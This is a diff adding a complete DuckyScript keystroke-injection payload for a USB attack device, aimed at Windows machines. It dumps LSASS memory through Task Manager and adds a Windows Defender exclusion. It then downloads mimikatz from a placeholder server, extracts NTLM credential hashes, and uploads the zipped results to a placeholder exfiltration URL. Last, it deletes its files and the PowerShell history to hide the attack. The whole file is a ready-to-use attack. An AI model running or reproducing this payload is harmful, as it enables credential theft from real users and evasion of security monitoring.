@@ -1,0 +1,121 @@
+REM Title: DuckyScript payload for data exfiltration over a network medium
+REM Author: jakobfriedl
+ATTACKMODE HID
+
+REM OS Detection to ensure the target is Windows
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS != WINDOWS)                                                                                                                 
+    LED_R                                                                                                                                       
+    STOP_PAYLOAD 
+END_IF
+
+REM Define the URL of the server hosting the mimikatz executable
+DEFINE #SERVER_URL http://XXX.XXX.XXX.XXX
+
+REM Define the URL of the webserver to exfiltrate the credentials to
+DEFINE #EXFIL_URL http://XXX.XXX.XXX.XXX
+
+DELAY 1000
+
+REM Delete existing dump file
+GUI r
+DELAY 200
+STRINGLN powershell "rm $env:TEMP\lsass.DMP"
+DELAY 200
+
+REM Create lsass-dump using the TaskManager
+GUI r
+DELAY 200
+STRING taskmgr
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 500
+DOWNARROW
+DELAY 1000
+STRING lsass
+DELAY 500
+SHIFT F10
+$I = 0
+WHILE ($I < 5) 
+    UPARROW
+    $I = ($I + 1)
+END_WHILE
+ENTER
+DELAY 500
+ENTER
+ALT F4
+
+REM Add exclusion path to the Windows Defender settings
+GUI r
+DELAY 200
+STRING powershell.exe
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 500
+STRINGLN if((Get-MpComputerStatus).RealTimeProtectionEnabled){Set-MpPreference -ExclusionPath $env:TEMP}
+
+REM Download mimikatz.exe from webserver
+STRINGLN wget #SERVER_URL/mimikatz.exe -o $env:TEMP\mimikatz.exe
+DELAY 1000
+
+REM Execute mimikatz and the necessary commands
+STRINGLN cd $env:TEMP
+STRINGLN .\mimikatz.exe "privilege::debug"
+STRINGLN log exfiltration.log
+STRINGLN sekurlsa::minidump lsass.DMP
+STRINGLN sekurlsa::logonpasswords
+DELAY 5000
+CTRL c
+DELAY 500
+
+REM Format mimikatz-log for exfiltration
+STRINGLN cat .\exfiltration.log | Select-String -Pattern "NTLM" -Context 2,0  | Get-Unique > credentials.txt
+
+REM Create zip archive of prepared data
+DEFINE #archive $env:COMPUTERNAME'-exfiltration-data.zip'
+STRING Compress-Archive -Force -Path $env:TEMP\exfiltration.log, $env:TEMP\credentials.txt -DestinationPath $env:TEMP\
+STRINGLN #archive
+DELAY 500
+
+REM Exfiltration
+STRING Invoke-WebRequest -Method PUT -InFile $env:TEMP\
+STRING #archive
+SPACE 
+STRING -Uri #EXFIL_URL
+STRINGLN #archive
+DELAY 500
+
+REM Clean-up
+REM Remove files
+STRINGLN rm $env:TEMP\lsass.DMP
+STRINGLN rm $env:TEMP\mimikatz.exe
+STRINGLN rm $env:TEMP\exfiltration.log
+STRINGLN rm $env:TEMP\credentials.txt
+STRINGLN rm $env:TEMP\data.zip
+REM Reset configurations
+STRINGLN Remove-MpPreference -ExclusionPath $env:TEMP
+REM Delete Powershell history
+STRINGLN rm (Get-PSReadLineOption).HistorySavePath
